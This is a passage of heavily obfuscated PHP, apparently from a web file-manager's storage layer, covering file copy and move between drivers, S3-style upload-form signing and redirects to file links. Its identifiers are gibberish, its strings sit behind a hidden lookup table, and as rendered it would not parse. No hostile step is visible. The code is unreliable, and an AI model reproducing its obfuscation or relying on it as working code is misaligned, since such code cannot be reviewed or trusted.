$âÍŸ–ÔÈ[110]; } return $âÍŸ–ÔÈ[1370]; } public static function driverType($Ûœš ‰†) { $ğ¢¥”´ =& $_SERVER[³à¼î¯á]; $ËĞî¯ğİ = str_replace($ğ¢¥”´[1371], $ğ¢¥”´[12], strtolower($Ûœš ‰†->getType())); if ($ËĞî¯ğİ == $ğ¢¥”´[802] || $ËĞî¯ğİ == $ğ¢¥”´[1372] || $ËĞî¯ğİ == $ğ¢¥”´[1373]) { $Ûœš ‰† = self::defaultDriverInit(); } else { if ($ËĞî¯ğİ == $ğ¢¥”´[1258] || $ËĞî¯ğİ == $ğ¢¥”´[1374]) { $Ûœš ‰† = IO::init($Ûœš ‰†->pathParse[$ğ¢¥”´[1204]]); } } $‡Š½â©… = $Ûœš ‰†->path; $ËĞî¯ğİ = str_replace($ğ¢¥”´[1371], $ğ¢¥”´[12], strtolower($Ûœš ‰†->getType())); if ($ËĞî¯ğİ == $ğ¢¥”´[109]) { return array($ğ¢¥”´[33] => $ğ¢¥”´[109], $ğ¢¥”´[1368] => $ğ¢¥”´[12], $ğ¢¥”´[87] => $‡Š½â©…, $ğ¢¥”´[98] => $Ûœš ‰†); } return array($ğ¢¥”´[33] => $ğ¢¥”´[913], $ğ¢¥”´[1368] => $Ûœš ‰†->pathDriver, $ğ¢¥”´[87] => $‡Š½â©…, $ğ¢¥”´[98] => $Ûœš ‰†); } public static function pathDriverType($ÏüĞêÊ) { return $ÏüĞêÊ ? self::driverType(IO::init($ÏüĞêÊ)) : !1; } public static function pathDriverLocal($Ÿ€¶ô‹) { $çşÃ¡† =& $_SERVER[³à¼î¯á]; $‡·‹Ë„¥ = $Ÿ€¶ô‹ ? self::driverType(IO::init($Ÿ€¶ô‹)) : !1; return $‡·‹Ë„¥[$çşÃ¡†[33]] == $çşÃ¡†[109] ? !0 : !1; } public static function allowCover($ı†éèİë, $¿ŞÏÆÇ§ = true) { $ÃÀ“µ‡Œ =& $_SERVER[³à¼î¯á]; if (is_string($ı†éèİë)) { $ı†éèİë = IO::info($ı†éèİë); } if (!$ı†éèİë || $ı†éèİë[$ÃÀ“µ‡Œ[33]] == $ÃÀ“µ‡Œ[78] || $ı†éèİë[$ÃÀ“µ‡Œ[79]] <= 100) { return !1; } if (isset($ı†éèİë[$ÃÀ“µ‡Œ[1375]]) || !$ı†éèİë[$ÃÀ“µ‡Œ[87]]) { return !1; } if (isset($ı†éèİë[$ÃÀ“µ‡Œ[223]]) && !$ı†éèİë[$ÃÀ“µ‡Œ[223]]) { return !1; } static $é³º“‰ø = false; if (!$é³º“‰ø || !$¿ŞÏÆÇ§) { $ı†ÈïëÙ = self::driverType(IO::init($ı†éèİë[$ÃÀ“µ‡Œ[87]])); $ø£Î˜ˆŒ = $ı†ÈïëÙ[$ÃÀ“µ‡Œ[98]]; $é³º“‰ø = $ÃÀ“µ‡Œ[187]; if ($ı†ÈïëÙ[$ÃÀ“µ‡Œ[33]] == $ÃÀ“µ‡Œ[109]) { $é³º“‰ø = $ÃÀ“µ‡Œ[1376]; } if ($ı†ÈïëÙ[$ÃÀ“µ‡Œ[98]] && is_array($ı†ÈïëÙ[$ÃÀ“µ‡Œ[98]]->config)) { $‹˜Ã¥ = $ı†ÈïëÙ[$ÃÀ“µ‡Œ[98]]->config; if (isset($‹˜Ã¥[$ÃÀ“µ‡Œ[1377]]) && $‹˜Ã¥[$ÃÀ“µ‡Œ[1377]]) { $é³º“‰ø = $ÃÀ“µ‡Œ[1376]; } } } return $é³º“‰ø == $ÃÀ“µ‡Œ[1376] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($’µµÌå¿) { parent::__construct($’µµÌå¿); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($‘¡¨â½¡) { $û¼œ§‘ã =& $_SERVER[³à¼î¯á]; if (substr($‘¡¨â½¡, 0, 7) == $û¼œ§‘ã[1378]) { $‘¡¨â½¡ = $û¼œ§‘ã[1379] . substr($‘¡¨â½¡, 7); } header($û¼œ§‘ã[165] . $‘¡¨â½¡); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Õ§úîÃš) { parent::__construct($Õ§úîÃš); $this->setSignVersion($_SERVER[³à¼î¯á][238]); } public function uploadFormData($«ê¸«ŞÀ, $¶ÛõóùŒ = 3600) { $Û— ĞÕª =& $_SERVER[³à¼î¯á]; $”¥àî„• = $Û— ĞÕª[220]; $ĞûúÃ¤§ = $Û— ĞÕª[254]; $ùİ–Äóş = $Û— ĞÕª[265]; $ØÜ¨À—Ğ = gmdate($Û— ĞÕª[1380], time() + $¶ÛõóùŒ); $ïë¢¨ú = (string) time() . $Û— ĞÕª[74] . (string) (time() + $¶ÛõóùŒ); $ÍğÇ„ÂĞ = array($Û— ĞÕª[266] => $ØÜ¨À—Ğ, $Û— ĞÕª[269] => array(array($Û— ĞÕª[271] => $”¥àî„•), array($Û— ĞÕª[270] => $this->bucket), array($Û— ĞÕª[272], $Û— ĞÕª[273], $Û— ĞÕª[12]), array($Û— ĞÕª[276] => $ùİ–Äóş), array($Û— ĞÕª[1381] => $ĞûúÃ¤§), array($Û— ĞÕª[1382] => $this->accessKey), array($Û— ĞÕª[1383] => $ïë¢¨ú))); $ÍğÇ„ÂĞ = json_encode($ÍğÇ„ÂĞ); $·Ùâ½º† = hash_hmac($Û— ĞÕª[254], $ïë¢¨ú, $this->secret); $·ƒ×ï‚ö = sha1($ÍğÇ„ÂĞ); $·ÑÜÖ¿ = hash_hmac($Û— ĞÕª[254], $·ƒ×ï‚ö, $·Ùâ½º†); $¢™Ìğ‚œ = array($Û— ĞÕª[271] => $”¥àî„•, $Û— ĞÕª[276] => $ùİ–Äóş, $Û— ĞÕª[284] => base64_encode($ÍğÇ„ÂĞ), $Û— ĞÕª[1381] => $ĞûúÃ¤§, $Û— ĞÕª[1382] => $this->accessKey, $Û— ĞÕª[1384] => $ïë¢¨ú, $Û— ĞÕª[1385] => $·ÑÜÖ¿, $Û— ĞÕª[199] => $this->getHost()); return $¢™Ìğ‚œ; } public function fileOutImage($¬õìãÀÓ, $¦ÉÅ×™¶ = 250) { $ŠÆèïÀ =& $_SERVER[³à¼î¯á]; if ($this->size($¬õìãÀÓ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¬õìãÀÓ, $¦ÉÅ×™¶); } $æ¡ö¬ = $this->link($¬õìãÀÓ); $æ¡ö¬ .= $ŠÆèïÀ[1386] . $¦ÉÅ×™¶ . $ŠÆèïÀ[1387]; $this->fileOutLink($æ¡ö¬); } public function fileOutLink($•ˆ¤‘ÅŞ) { $ªî ÑØò =& $_SERVER[³à¼î¯á]; if (substr($•ˆ¤‘ÅŞ, 0, 7) == $ªî ÑØò[1378]) { $•ˆ¤‘ÅŞ = $ªî ÑØò[1379] . substr($•ˆ¤‘ÅŞ, 7); } header($ªî ÑØò[165] . $•ˆ¤‘ÅŞ); die; } } goto bå³—¬å„; A“±Ê‹ñ­: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ûÃ„¼ÂÊ, $¿şÁ·ÊÜ) { $¤‚ÕïÜ =& $_SERVER[³à¼î¯á]; $™Æàæš¼ = $¿şÁ·ÊÜ; $GLOBALS[$¤‚ÕïÜ[1199]] = $¤‚ÕïÜ[1200] . $ûÃ„¼ÂÊ; Hook::trigger($¤‚ÕïÜ[1200] . $ûÃ„¼ÂÊ . $¤‚ÕïÜ[1201], $™Æàæš¼); $ñ‚†¬Ø¡ = self::driverMake($¿şÁ·ÊÜ[0]); if (!$ñ‚†¬Ø¡) { return !1; } if (method_exists($ñ‚†¬Ø¡, $ûÃ„¼ÂÊ)) { $æ²£€ñÚ = @call_user_func_array(array($ñ‚†¬Ø¡, $ûÃ„¼ÂÊ), $¿şÁ·ÊÜ); } else { if (method_exists($ñ‚†¬Ø¡, $¤‚ÕïÜ[1202])) { $æ²£€ñÚ = @call_user_func_array(array($ñ‚†¬Ø¡, $ûÃ„¼ÂÊ), $¿şÁ·ÊÜ); } else { if (method_exists(self, $ûÃ„¼ÂÊ)) { $æ²£€ñÚ = @call_user_func_array(array(self, $ûÃ„¼ÂÊ), $¿şÁ·ÊÜ); } else { $æ²£€ñÚ = call_user_func_array(array(parent, $ûÃ„¼ÂÊ), $¿şÁ·ÊÜ); } } } Hook::trigger($¤‚ÕïÜ[1200] . $ûÃ„¼ÂÊ . $¤‚ÕïÜ[1203], $™Æàæš¼, $æ²£€ñÚ); return $æ²£€ñÚ; } public static function init($Ç–êÊšÖ) { return self::driverMake($Ç–êÊšÖ); } public static function copy($™‘‚Çéê, $»Ûàõ†, $ı· ÃÁ¼ = false, $¡ïØçúÓ = false) { return self::copyMoveStart($™‘‚Çéê, $»Ûàõ†, $ı· ÃÁ¼, $_SERVER[³à¼î¯á][593], $¡ïØçúÓ); } public static function move($Ÿ®ı †, $•Œ¨‹…§, $…ÅšíĞõ = false, $Öšµà» = false) { return self::copyMoveStart($Ÿ®ı †, $•Œ¨‹…§, $…ÅšíĞõ, $_SERVER[³à¼î¯á][595], $Öšµà»); } private static function copyMoveStart($ñ»şìÂÑ, $Î£ãí, $¿‰ŸŸÛ¡, $¡Ü°Èƒ†, $¥Ğ†şÙ‹) { $èí ÷¯ü =& $_SERVER[³à¼î¯á]; $¡¥ÌÅËä = array($ñ»şìÂÑ, $Î£ãí, $¿‰ŸŸÛ¡, $¥Ğ†şÙ‹); Hook::trigger($èí ÷¯ü[1200] . $¡Ü°Èƒ† . $èí ÷¯ü[1201], $¡¥ÌÅËä); $´ÀÔõò€ = self::copyMove($ñ»şìÂÑ, $Î£ãí, $¿‰ŸŸÛ¡, $¡Ü°Èƒ†, $¥Ğ†şÙ‹); Hook::trigger($èí ÷¯ü[1200] . $¡Ü°Èƒ† . $èí ÷¯ü[1203], $¡¥ÌÅËä, $´ÀÔõò€); return $´ÀÔõò€; } public static function saveFile($™§Èéë—, $Îñ´ùôŠ, $œòŒÊÏ² = true) { $ºı°š¾ =& $_SERVER[³à¼î¯á]; $æú¥™Ì¹ = self::info($Îñ´ùôŠ); $æå¹Õà = self::driverMake($™§Èéë—); $­ÆÉÔş˜ = self::driverMake($Îñ´ùôŠ); $ƒèÒêåá = !1; if ($­ÆÉÔş˜->pathParse[$ºı°š¾[1204]]) { $ƒèÒêåá = $­ÆÉÔş˜; $®·öÅˆ» = $­ÆÉÔş˜->pathParse[$ºı°š¾[1204]]; $­ÆÉÔş˜ = self::driverMake($®·öÅˆ»); } if ($æå¹Õà->pathParse[$ºı°š¾[1204]]) { $ò÷¼Ÿº‡ = $æå¹Õà->pathParse[$ºı°š¾[1204]]; $æå¹Õà = self::driverMake($ò÷¼Ÿº‡); } $ô¸ƒ˜Ö± = $­ÆÉÔş˜->pathFather($Îñ´ùôŠ); $ñ¨ÑûÂ± = !0; if (!$œòŒÊÏ² && self::driverIsSame($æå¹Õà, $­ÆÉÔş˜)) { $ñ¨ÑûÂ± = !1; } $•Õ·ÓÕ = self::copyFile($æå¹Õà, $™§Èéë—, $­ÆÉÔş˜, $ô¸ƒ˜Ö±, $æú¥™Ì¹[$ºı°š¾[32]], $ñ¨ÑûÂ±); if ($ƒèÒêåá) { $•Õ·ÓÕ = $ƒèÒêåá->getPathOuter($•Õ·ÓÕ); } return $•Õ·ÓÕ; } private static function copyMove($ıøÔ½Ã, $šÊğ°úì, $Ö¢··º”, $ê’ª¢Ôä, $‡è­¶²ù = false) { $üİ˜ÏÑ =& $_SERVER[³à¼î¯á]; if (!$ıøÔ½Ã || $ıøÔ½Ã == $üİ˜ÏÑ[8] || !$šÊğ°úì) { return !1; } ignore_timeout(); $¹ù‚İË = self::driverMake($ıøÔ½Ã); $û¾úĞÙ = self::driverMake($šÊğ°úì); $©Ş¸½Î‰ = $ê’ª¢Ôä == $üİ˜ÏÑ[595]; $ñ‡ñ² = !1; if ($û¾úĞÙ->pathParse[$üİ˜ÏÑ[1204]]) { $ñ‡ñ² = $û¾úĞÙ; $šÊğ°úì = $û¾úĞÙ->pathParse[$üİ˜ÏÑ[1204]]; $û¾úĞÙ = self::driverMake($šÊğ°úì); } if ($¹ù‚İË->pathParse[$üİ˜ÏÑ[1204]]) { $ıøÔ½Ã = $¹ù‚İË->pathParse[$üİ˜ÏÑ[1204]]; $¹ù‚İË = self::driverMake($ıøÔ½Ã); } self::check($¹ù‚İË, $ıøÔ½Ã, $û¾úĞÙ, $šÊğ°úì); Hook::trigger($üİ˜ÏÑ[1205], $¹ù‚İË, $ıøÔ½Ã, $û¾úĞÙ, $šÊğ°úì); $—©ˆİÛ‚ = self::driverIsSame($¹ù‚İË, $û¾úĞÙ); if ($—©ˆİÛ‚) { if ($ê’ª¢Ôä == $üİ˜ÏÑ[595] && !method_exists($û¾úĞÙ, $üİ˜ÏÑ[1206]) && trim($šÊğ°úì, $üİ˜ÏÑ[8]) == trim($û¾úĞÙ->pathFather($ıøÔ½Ã), $üİ˜ÏÑ[8])) { if ($¹ù‚İË->pathThis($ıøÔ½Ã) != $‡è­¶²ù && !$¹ù‚İË->isOsDriver()) { return $¹ù‚İË->rename($ıøÔ½Ã, $‡è­¶²ù); } return $û¾úĞÙ->getPathOuter($ıøÔ½Ã); } if (method_exists($û¾úĞÙ, $ê’ª¢Ôä)) { return $û¾úĞÙ->{$ê’ª¢Ôä}($ıøÔ½Ã, $šÊğ°úì, $Ö¢··º”, $‡è­¶²ù); } } if ($—©ˆİÛ‚ && $ê’ª¢Ôä == $üİ˜ÏÑ[595] && $û¾úĞÙ->getType() == $üİ˜ÏÑ[109]) { $ø«§šÌ = $û¾úĞÙ->movePath($ıøÔ½Ã, $šÊğ°úì, $‡è­¶²ù); if ($ø«§šÌ) { return $ø«§šÌ; } } $Ø€·¸«¸ = $¹ù‚İË->isFile($ıøÔ½Ã); if (!$Ø€·¸«¸ && $û¾úĞÙ->getType() == $üİ˜ÏÑ[802] && $¹ù‚İË->getType() == $üİ˜ÏÑ[109]) { $ø«§šÌ = $û¾úĞÙ->copyFolderFromIO($¹ù‚İË, $ıøÔ½Ã, $šÊğ°úì, $Ö¢··º”, $©Ş¸½Î‰, $‡è­¶²ù); } else { $ø«§šÌ = self::copyPath($¹ù‚İË, $ıøÔ½Ã, $û¾úĞÙ, $šÊğ°úì, $Ö¢··º”, $©Ş¸½Î‰, $Ø€·¸«¸, $‡è­¶²ù); } if ($ø«§šÌ && $©Ş¸½Î‰) { $¹ù‚İË->remove($ıøÔ½Ã); } if ($ñ‡ñ²) { $ø«§šÌ = $ñ‡ñ²->getPathOuter($ø«§šÌ); } return $ø«§šÌ; } private static function check($Ÿ•èê¶¥, $‰ÉÎë¶î, $ÂåéÊÕò, &$àÃ˜û) { $õ½ı“Ôµ =& $_SERVER[³à¼î¯á]; if (self::driverIsSame($Ÿ•èê¶¥, $ÂåéÊÕò) && $Ÿ•èê¶¥->isFolder($‰ÉÎë¶î) && $Ÿ•èê¶¥->isParentOf($‰ÉÎë¶î, $àÃ˜û)) { show_json(LNG($õ½ı“Ôµ[1207]), !1); } if (!$Ÿ•èê¶¥->exist($‰ÉÎë¶î)) { show_json(LNG($õ½ı“Ôµ[108]), !1); } } private static function copyPath($Ç•àÁãˆ, $´ÍÁ¾ÑĞ, $ª¦Ñ¤ïì, $×Ü¼µØÌ, $ö¾áˆ, $ê¡×Œ˜, $°¼É‘¯ß, $ƒ‰Šúì = false, $Ûø²½ëÆ = true) { $õÁÅÚ²– =& $_SERVER[³à¼î¯á]; $İûºÇá = empty($ƒ‰Šúì) && $ƒ‰Šúì !== $õÁÅÚ²–[219] ? $Ç•àÁãˆ->pathThis($´ÍÁ¾ÑĞ) : $ƒ‰Šúì; if ($ö¾áˆ) { $Í¨­êÅ— = $ª¦Ñ¤ïì->fileNameExist($×Ü¼µØÌ, $İûºÇá); $ò»ó»ú = $İûºÇá; $İûºÇá = $ª¦Ñ¤ïì->fileNameAuto($×Ü¼µØÌ, $İûºÇá, $ö¾áˆ, !$°¼É‘¯ß); if (!$Í¨­êÅ— || $ò»ó»ú != $İûºÇá) { $ö¾áˆ = !1; } if ($Ûø²½ëÆ && !$ö¾áˆ) { $ª¦Ñ¤ïì->_data[$õÁÅÚ²–[1208]] = !0; } } if ($°¼É‘¯ß) { return self::copyFile($Ç•àÁãˆ, $´ÍÁ¾ÑĞ, $ª¦Ñ¤ïì, $×Ü¼µØÌ, $İûºÇá, $ê¡×Œ˜); } if ($ö¾áˆ == REPEAT_RENAME_FOLDER) { $ö¾áˆ = !1; } $›ÙÃĞÈé = rtrim($×Ü¼µØÌ, $õÁÅÚ²–[8]) . $õÁÅÚ²–[8] . $İûºÇá; $û‡‚õøğ = $ª¦Ñ¤ïì->mkdir($ª¦Ñ¤ïì->getPath($›ÙÃĞÈé), $ö¾áˆ); $×Ü¼µØÌ = $ª¦Ñ¤ïì->getPathInner($û‡‚õøğ); $çŸ¶Ã = $Ç•àÁãˆ->listPath($´ÍÁ¾ÑĞ, !0); $çŸ¶Ã = is_array($çŸ¶Ã) ? $çŸ¶Ã : array($õÁÅÚ²–[86] => array(), $õÁÅÚ²–[85] => array()); $Çëæ´Ñ’ = array_merge($çŸ¶Ã[$õÁÅÚ²–[86]], $çŸ¶Ã[$õÁÅÚ²–[85]]); foreach ($Çëæ´Ñ’ as $ºá†¢ï•) { $úçÆÓ±ì = $ºá†¢ï•[$õÁÅÚ²–[33]] == $õÁÅÚ²–[221]; $´ÍÁ¾ÑĞ = $Ç•àÁãˆ->getPathInner($ºá†¢ï•[$õÁÅÚ²–[87]]); $Š€…§¯ó = self::copyPath($Ç•àÁãˆ, $´ÍÁ¾ÑĞ, $ª¦Ñ¤ïì, $×Ü¼µØÌ, $ö¾áˆ, $ê¡×Œ˜, $úçÆÓ±ì, !1, !1); if (!$Š€…§¯ó) { IO::errorTips($õÁÅÚ²–[1209] . $´ÍÁ¾ÑĞ . $õÁÅÚ²–[73] . $×Ü¼µØÌ); } } self::copyMoveKeepInfo($Ç•àÁãˆ, $´ÍÁ¾ÑĞ, $û‡‚õøğ); return $û‡‚õøğ; } private static function copyFile($–”¦áö, $îŒºâû, $Ì¨ÁéŞ, $©œıîÜù, $Ì´¦¼½Û, $¶úÈƒÊ) { $òŒ—ÓıÏ =& $_SERVER[³à¼î¯á]; $©œıîÜù = $Ì¨ÁéŞ->getPath(rtrim($©œıîÜù, $òŒ—ÓıÏ[8]) . $òŒ—ÓıÏ[8] . $Ì´¦¼½Û); $ûÒ¬†İş = $òŒ—ÓıÏ[1210] . time() . rand_string(5); Hook::trigger($òŒ—ÓıÏ[1211], $–”¦áö, $îŒºâû, $Ì¨ÁéŞ, $©œıîÜù, $Ì´¦¼½Û, $ûÒ¬†İş); if (self::driverIsSame($–”¦áö, $Ì¨ÁéŞ)) { if ($¶úÈƒÊ) { $ÂõÅÔø = $Ì¨ÁéŞ->moveFile($îŒºâû, $©œıîÜù); } else { $ÂõÅÔø = $Ì¨ÁéŞ->copyFile($îŒºâû, $©œıîÜù); } Hook::trigger($òŒ—ÓıÏ[1212], $–”¦áö, $îŒºâû, $Ì¨ÁéŞ, $©œıîÜù, $Ì´¦¼½Û, $ÂõÅÔø); self::copyMoveKeepInfo($–”¦áö, $îŒºâû, $ÂõÅÔø); return $ÂõÅÔø; } $­ôàóŞ = TEMP_FILES; if ($GLOBALS[$òŒ—ÓıÏ[6]][$òŒ—ÓıÏ[92]][$òŒ—ÓıÏ[840]]) { $­ôàóŞ = $GLOBALS[$òŒ—ÓıÏ[6]][$òŒ—ÓıÏ[92]][$òŒ—ÓıÏ[840]]; } $Ó•“ªÆĞ = $­ôàóŞ; mk_dir($Ó•“ªÆĞ); $Æ”İâ— = $Ó•“ªÆĞ . $ûÒ¬†İş; $ºÅ×®Ò = $Æ”İâ—; $Æ”İâ— = $–”¦áö->download($îŒºâû, $Æ”İâ—); $Æ”İâ— = $–”¦áö->iconvApp($Æ”İâ—); if (substr($Æ”İâ—, strlen($­ôàóŞ)) == $­ôàóŞ) { $¶úÈƒÊ = !0; } $ÂõÅÔø = $Ì¨ÁéŞ->upload($©œıîÜù, $Æ”İâ—, $¶úÈƒÊ); self::remove($ºÅ×®Ò); Hook::trigger($òŒ—ÓıÏ[1212], $–”¦áö, $îŒºâû, $Ì¨ÁéŞ, $©œıîÜù, $Ì´¦¼½Û, $ÂõÅÔø); self::copyMoveKeepInfo($–”¦áö, $îŒºâû, $ÂõÅÔø); return $ÂõÅÔø; } private static function copyMoveKeepInfo($ñÂ„ç˜‚, $¶ã©ÙÑ¢, $íóì´şÆ) { if (!$íóì´şÆ) { return; } $şš†Œèë = $ñÂ„ç˜‚->info($¶ã©ÙÑ¢); if (!is_array($şš†Œèë)) { return; } IO::setModifyTime($íóì´şÆ, $şš†Œèë[$_SERVER[³à¼î¯á][88]]); } public static function pathFather($”Ø©”–¡) { $ú¡ª¹Áõ = IO::init($”Ø©”–¡); $ıß÷ÏÏ¢ = $ú¡ª¹Áõ->pathFather($ú¡ª¹Áõ->path); return $ú¡ª¹Áõ->getPathOuter($ıß÷ÏÏ¢); } public static function fileOut($ ™‰³ÙĞ, $Öœ¡Éœæ = false, $¶şŞé‡ = false, $Ê—¬îîÅ = '') { $°‰£Ù‡ì = self::driverMake($ ™‰³ÙĞ); if ($°‰£Ù‡ì->isFileOutServer()) { return $°‰£Ù‡ì->fileOutServer($ ™‰³ÙĞ, $Öœ¡Éœæ, $¶şŞé‡, $Ê—¬îîÅ); } return $°‰£Ù‡ì->fileOut($ ™‰³ÙĞ, $Öœ¡Éœæ, $¶şŞé‡, $Ê—¬îîÅ); } public static function fileOutImage($²ûÂ·¸®, $şøÏ®îÒ = 250) { $ïÊ€ü›´ = array(250, 600, 1200, 2000, 3000, 5000); for ($ü”·ĞôÈ = 0; $ü”·ĞôÈ < count($ïÊ€ü›´); $ü”·ĞôÈ++) { if ($ü”·ĞôÈ == 0 && $şøÏ®îÒ <= $ïÊ€ü›´[$ü”·ĞôÈ]) { $şøÏ®îÒ = $ïÊ€ü›´[$ü”·ĞôÈ]; break; } else { if ($şøÏ®îÒ > $ïÊ€ü›´[$ü”·ĞôÈ - 1] && $şøÏ®îÒ <= $ïÊ€ü›´[$ü”·ĞôÈ]) { $şøÏ®îÒ = $ïÊ€ü›´[$ü”·ĞôÈ]; break; } else { if ($ü”·ĞôÈ == count($ïÊ€ü›´) - 1 && $şøÏ®îÒ > $ïÊ€ü›´[$ü”·ĞôÈ]) { $şøÏ®îÒ = $ïÊ€ü›´[$ü”·ĞôÈ]; break; } } } } $‚ûÒò = self::driverMake($²ûÂ·¸®); if ($‚ûÒò->isFileOutServer()) { return $‚ûÒò->fileOutImageServer($²ûÂ·¸®, $şøÏ®îÒ); } return $‚ûÒò->fileOutImage($²ûÂ·¸®, $şøÏ®îÒ); } private static function driverIsSame($ŠÀÛ´ŒÉ, $ÀÔ×å‘) { $ —äÊ¥¼ =& $_SERVER[³à¼î¯á]; $¥Ç—Çº™ = $ŠÀÛ´ŒÉ->getType(); $Á±’É†º = $ÀÔ×å‘->getType(); if ($¥Ç—Çº™ != $Á±’É†º) { return !1; } if ($¥Ç—Çº™ == $ —äÊ¥¼[802]) { return !0; } if ($¥Ç—Çº™ == $ —äÊ¥¼[109]) { return !0; } if ($ŠÀÛ´ŒÉ->pathDriver == $ÀÔ×å‘->pathDriver) { return !0; } return !1; } public static function copyUpdate($á“åè’ã, $Ø“Üµ) { $‰ŒÓ›ğ =& $_SERVER[³à¼î¯á]; if (!IO::exist($á“åè’ã)) { return !1; } if (!IO::exist($Ø“Üµ)) { IO::mkdir($Ø“Üµ); } $£ÖûÒ†Ç = array_to_keyvalue(self::listAllSimple($á“åè’ã), $‰ŒÓ›ğ[87]); $âª®…ŠÒ = array_to_keyvalue(self::listAllSimple($Ø“Üµ), $‰ŒÓ›ğ[87]); $ƒ†»§Í¦ = array(); $¾“à¹›¡ = array(); foreach ($£ÖûÒ†Ç as $ÃŸÑöœ¬ => $ğïáê‚¼) { if (isset($âª®…ŠÒ[$ÃŸÑöœ¬])) { if ($ğïáê‚¼[$‰ŒÓ›ğ[78]] == 1) { continue; } if ($âª®…ŠÒ[$ÃŸÑöœ¬][$‰ŒÓ›ğ[79]] == $ğïáê‚¼[$‰ŒÓ›ğ[79]]) { continue; } } if ($ğïáê‚¼[$‰ŒÓ›ğ[78]] == 1) { $¾“à¹›¡[] = $Ø“Üµ . $‰ŒÓ›ğ[8] . trim($ÃŸÑöœ¬, $‰ŒÓ›ğ[8]); continue; } $Œ¥êóÔì = strstr(trim($ÃŸÑöœ¬, $‰ŒÓ›ğ[8]), $‰ŒÓ›ğ[8]) ? get_path_father($ÃŸÑöœ¬) : $‰ŒÓ›ğ[12]; $ƒ†»§Í¦[] = array($‰ŒÓ›ğ[1213] => $ğïáê‚¼[$‰ŒÓ›ğ[89]], $‰ŒÓ›ğ[1214] => rtrim($Ø“Üµ, $‰ŒÓ›ğ[8]) . $‰ŒÓ›ğ[8] . $Œ¥êóÔì, $‰ŒÓ›ğ[1215] => $ğïáê‚¼); } $“ù³¦¬³ = array($‰ŒÓ›ğ[221] => $ƒ†»§Í¦, $‰ŒÓ›ğ[78] => $¾“à¹›¡); Hook::trigger($‰ŒÓ›ğ[1216], $á“åè’ã, $Ø“Üµ, $“ù³¦¬³); foreach ($¾“à¹›¡ as $ğïáê‚¼) { IO::mkdir($ğïáê‚¼); } foreach ($ƒ†»§Í¦ as $ğïáê‚¼) { IO::copy($ğïáê‚¼[$‰ŒÓ›ğ[1213]], $ğïáê‚¼[$‰ŒÓ›ğ[1214]], REPEAT_REPLACE); } } public static function fileSubstr($­«şÑ•Œ, $™Ó¾–ıò, $¢¦¤ü² = false) { $„Éà±ù… =& $_SERVER[³à¼î¯á]; $®ğğ»Ä = self::driverMake($­«şÑ•Œ); $ ’ÓÛùª = $®ğğ»Ä->size($­«şÑ•Œ); $ÓÒ¿Üúî = $™Ó¾–ıò; $’´ŸÂ¥á = $¢¦¤ü²; if ($™Ó¾–ıò < 0) { $™Ó¾–ıò = $ ’ÓÛùª + $™Ó¾–ıò; } if ($¢¦¤ü² === !1) { $¢¦¤ü² = $ ’ÓÛùª - $™Ó¾–ıò; } if ($™Ó¾–ıò + $¢¦¤ü² > $ ’ÓÛùª) { $¢¦¤ü² = $ ’ÓÛùª - $™Ó¾–ıò; } if (!$ ’ÓÛùª && $®ğğ»Ä->getType() == $„Éà±ù…[109] && !$®ğğ»Ä->exist($­«şÑ•Œ)) { $õ’ã®ã = get_path_this($­«şÑ•Œ); $•‹ÆŞï¼ = parse_url_query($õ’ã®ã); if (is_array($•‹ÆŞï¼) && isset($•‹ÆŞï¼[$„Éà±ù…[32]])) { $õ’ã®ã = urldecode($•‹ÆŞï¼[$„Éà±ù…[32]]); } throw new Exception($„Éà±ù…[1217] . LNG($„Éà±ù…[1218]) . $„Éà±ù…[1016] . clear_html($õ’ã®ã) . $„Éà±ù…[12]); } if ($¢¦¤ü² <= 0) { return $„Éà±ù…[12]; } if ($™Ó¾–ıò < 0 || $™Ó¾–ıò >= $ ’ÓÛùª || $¢¦¤ü² > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\122\x65\141\x64\40\145\162\x72\157\162\x21\x20\x73\164\x61\x72\x74\x3d{$™Ó¾–ıò}\x3b\x6c\x65\x6e\147\x74\150\x3d{$¢¦¤ü²}\73\40\x73\151\x7a\x65\75{$ ’ÓÛùª}\73"); } $‘“¼Ğï = $®ğğ»Ä->fileSubstr($­«şÑ•Œ, $™Ó¾–ıò, $¢¦¤ü²); if (!$‘“¼Ğï && $¢¦¤ü² && isset($GLOBALS[$„Éà±ù…[1219]])) { throw new Exception($GLOBALS[$„Éà±ù…[1219]][$„Éà±ù…[1220]]); } return $‘“¼Ğï; } private static function driverMake(&$œ •Äİ‘) { $ÚáÈ» =& $_SERVER[³à¼î¯á]; $©ì”Ì‚ = KodIO::parse($œ •Äİ‘); if (!self::$driverListSystem) { $¼œ“øí» = Model($ÚáÈ»[812])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¼œ“øí», $ÚáÈ»[450]); } if ($©ì”Ì‚[$ÚáÈ»[33]] == KodIO::KOD_IO && !self::$driverListSystem[$©ì”Ì‚[$ÚáÈ»[450]]]) { throw new Exception($ÚáÈ»[1221]); return !1; } $œ •Äİ‘ = $©ì”Ì‚[$ÚáÈ»[1222]]; $ù¡ƒÑ„à = self::driverGet($©ì”Ì‚, $œ •Äİ‘); return $ù¡ƒÑ„à; } private static function driverGet($¸Î¡ò¼ª, &$§ÄêÙ§Â) { $•„çö„ =& $_SERVER[³à¼î¯á]; $”ØÀÈ€ê = $¸Î¡ò¼ª[$•„çö„[1223]]; $“éåºõÖ = $¸Î¡ò¼ª[$•„çö„[450]]; switch ($¸Î¡ò¼ª[$•„çö„[33]]) { case KodIO::KOD_IO: $œö¿«ˆè = self::$driverListSystem[$“éåºõÖ]; break; case KodIO::KOD_SOURCE: $§ÄêÙ§Â = $“éåºõÖ . $§ÄêÙ§Â; $œö¿«ˆè = array($•„çö„[1224] => $•„çö„[1225], $•„çö„[6] => $¸Î¡ò¼ª); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $³¥ùÜ = $GLOBALS[$•„çö„[1226]]; self::$driverListUser = array_to_keyvalue($³¥ùÜ, $•„çö„[450]); } $œö¿«ˆè = self::$driverListUser[$“éåºõÖ]; break; case KodIO::KOD_SHARE_LINK: $œö¿«ˆè = array($•„çö„[1224] => $•„çö„[1227], $•„çö„[6] => $¸Î¡ò¼ª); $œƒ¤²®° = 